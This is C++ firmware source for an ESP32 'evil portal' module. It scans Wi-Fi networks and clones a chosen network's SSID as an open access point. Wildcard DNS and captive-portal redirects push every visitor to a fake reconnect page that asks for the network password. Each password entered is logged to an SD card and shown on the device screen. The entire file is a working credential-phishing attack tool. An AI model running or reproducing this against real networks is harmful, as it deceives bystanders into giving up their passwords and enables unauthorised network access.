#include "wifi_evil_portal.h"

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <freertos/task.h>

#include "../hal/encoder.h"

WifiEvilPortalModule g_wifiEvilPortal;

extern SemaphoreHandle_t spi_mutex;

// ---- Captive portal HTML -----------------------------------------------------

static const char PORTAL_HTML[] =
    "<!DOCTYPE html><html><head><meta charset=UTF-8>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>WiFi</title><style>body{font-family:sans-serif;background:#f0f0f0;"
    "display:flex;justify-content:center;padding:40px}form{background:#fff;"
    "padding:24px;border-radius:8px;width:100%;max-width:320px}h2{margin:0 0 16px}"
    "input{width:100%;padding:10px;margin:8px 0 16px;border:1px solid #ccc;"
    "border-radius:4px;box-sizing:border-box}button{width:100%;padding:12px;"
    "background:#0070c0;color:#fff;border:none;border-radius:4px;font-size:16px;"
    "cursor:pointer}</style></head><body><form method=POST action=/login>"
    "<h2>WiFi</h2><p>Enter the network password to reconnect.</p>"
    "<input name=pw type=password placeholder=\"Password\" required>"
    "<button type=submit>Connect</button></form></body></html>";

// ---- AP list -----------------------------------------------------------------

struct PortalAPEntry {
    char    ssid[33];
    int32_t rssi;
    uint8_t channel;
};

static PortalAPEntry s_aps[16];
static uint8_t       s_apCount = 0;
static volatile bool s_doConfirm = false;

static uint8_t       s_clientCount = 0;
static uint8_t       s_capCount    = 0;

// ---- helpers -----------------------------------------------------------------

void WifiEvilPortalModule::setStatus(const char* s) {
    portENTER_CRITICAL(&mux_);
    strncpy(status_, s, sizeof(status_) - 1);
    status_[sizeof(status_) - 1] = '\0';
    portEXIT_CRITICAL(&mux_);
}

void WifiEvilPortalModule::confirm() {
    s_doConfirm = true;
}

// ---- Task -------------------------------------------------------------------

static void portalTask(void* arg) {
    WifiEvilPortalModule* self = reinterpret_cast<WifiEvilPortalModule*>(arg);

    // Phase 1: Scan APs
    self->setStatus("Scanning APs...");
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, true);
    s_apCount = 0;
    if (n > 0) {
        uint8_t cnt = (n > 16) ? 16 : (uint8_t)n;
        for (uint8_t i = 0; i < cnt; i++) {
            strncpy(s_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
            s_aps[i].ssid[32] = '\0';
            s_aps[i].rssi    = WiFi.RSSI(i);
            s_aps[i].channel = (uint8_t)WiFi.channel(i);
        }
        s_apCount = cnt;
    }
    WiFi.scanDelete();

    if (s_apCount == 0) {
        self->setStatus("No APs found");
        vTaskDelay(pdMS_TO_TICKS(1500));
        WiFi.mode(WIFI_OFF);
        self->clearTask();
        vTaskDelete(nullptr);
        return;
    }

    // Phase 2: Select AP
    self->state_ = PortalState::SELECTING;
    char buf[48];
    while (self->isRunning() && !s_doConfirm) {
        uint8_t idx = (self->scroll_ < s_apCount) ? self->scroll_ : (s_apCount - 1);
        snprintf(buf, sizeof(buf), "%u/%u %ddBm\nOK: %.22s",
                 idx + 1, s_apCount, s_aps[idx].rssi, s_aps[idx].ssid);
        self->setStatus(buf);
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    if (!self->isRunning()) {
        WiFi.mode(WIFI_OFF);
        self->clearTask();
        vTaskDelete(nullptr);
        return;
    }

    // Phase 3: Start captive portal
    uint8_t idx = (self->scroll_ < s_apCount) ? self->scroll_ : 0;
    char targetSSID[33];
    strncpy(targetSSID, s_aps[idx].ssid, 32);
    targetSSID[32] = '\0';
    uint8_t ch = s_aps[idx].channel;

    self->state_ = PortalState::RUNNING;
    s_clientCount = 0;
    s_capCount    = 0;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(targetSSID, nullptr, ch, 0, 8);

    // Ensure log directory exists
    if (xSemaphoreTake(spi_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
        if (SD.begin()) {
            if (!SD.exists("/portal")) {
                SD.mkdir("/portal");
            }
        }
        xSemaphoreGive(spi_mutex);
    }

    DNSServer dns;
    WebServer server(80);

    dns.start(53, "*", IPAddress(192, 168, 4, 1));

    // Capture the pointer for use in lambdas
    WifiEvilPortalModule* selfPtr = self;

    server.on("/", HTTP_GET, [&server]() {
        server.send(200, "text/html", PORTAL_HTML);
    });

    server.on("/login", HTTP_POST, [&server, selfPtr]() {
        String pw = server.arg("pw");
        if (pw.length() > 0) {
            s_capCount++;
            // Log to SD
            if (xSemaphoreTake(spi_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
                File f = SD.open("/portal/log.txt", FILE_APPEND);
                if (f) {
                    f.printf("PW: %s\n", pw.c_str());
                    f.close();
                }
                xSemaphoreGive(spi_mutex);
            }
            char sbuf[48];
            snprintf(sbuf, sizeof(sbuf), "Got: %.30s", pw.c_str());
            selfPtr->setStatus(sbuf);
        }
        // Redirect back to portal
        server.sendHeader("Location", "/");
        server.send(302, "text/plain", "");
    });

    // Android / iOS captive portal detection endpoints
    server.on("/generate_204", HTTP_GET, [&server]() {
        server.sendHeader("Location", "http://192.168.4.1/");
        server.send(302, "text/plain", "");
    });
    server.on("/hotspot-detect.html", HTTP_GET, [&server]() {
        server.sendHeader("Location", "http://192.168.4.1/");
        server.send(302, "text/plain", "");
    });
    server.onNotFound([&server]() {
        server.sendHeader("Location", "http://192.168.4.1/");
        server.send(302, "text/plain", "");
    });

    server.begin();

    snprintf(buf, sizeof(buf), "%.20s\nClients:0 Caps:0", targetSSID);
    self->setStatus(buf);

    while (self->isRunning()) {
        dns.processNextRequest();
        server.handleClient();
        s_clientCount = (uint8_t)WiFi.softAPgetStationNum();
        // Update status every ~500ms to avoid too-frequent string ops
        static uint32_t lastUpdate = 0;
        uint32_t now = millis();
        if (now - lastUpdate >= 500) {
            lastUpdate = now;
            snprintf(buf, sizeof(buf), "%.20s\nClients:%u Caps:%u",
                     targetSSID, s_clientCount, s_capCount);
            self->setStatus(buf);
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    server.stop();
    dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    self->clearTask();
    vTaskDelete(nullptr);
}

// ---- IModule ----------------------------------------------------------------

void WifiEvilPortalModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }
    scroll_     = 0;
    s_doConfirm = false;
    state_      = PortalState::SCANNING;
    xTaskCreatePinnedToCore(portalTask, "evil_portal", 6144, this, 1, &task_, 0);
}

void WifiEvilPortalModule::stop() {
    if (!running_) return;
    running_ = false;
    for (int i = 0; i < 100 && task_; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    task_ = nullptr;
}

void WifiEvilPortalModule::onEvent(uint8_t ev) {
    if (state_ == PortalState::SELECTING) {
        if (ev == static_cast<uint8_t>(encoder::EVENT_RIGHT) && s_apCount > 0)
            scroll_ = (scroll_ + 1) % s_apCount;
        else if (ev == static_cast<uint8_t>(encoder::EVENT_LEFT) && s_apCount > 0)
            scroll_ = (scroll_ + s_apCount - 1) % s_apCount;
        else if (ev == static_cast<uint8_t>(encoder::EVENT_OK) && s_apCount > 0)
            confirm();
    }
}

void WifiEvilPortalModule::fillStats(char* buf, size_t len) {
    portENTER_CRITICAL(&mux_);
    strncpy(buf, status_, len - 1);
    buf[len - 1] = '\0';
    portEXIT_CRITICAL(&mux_);
}
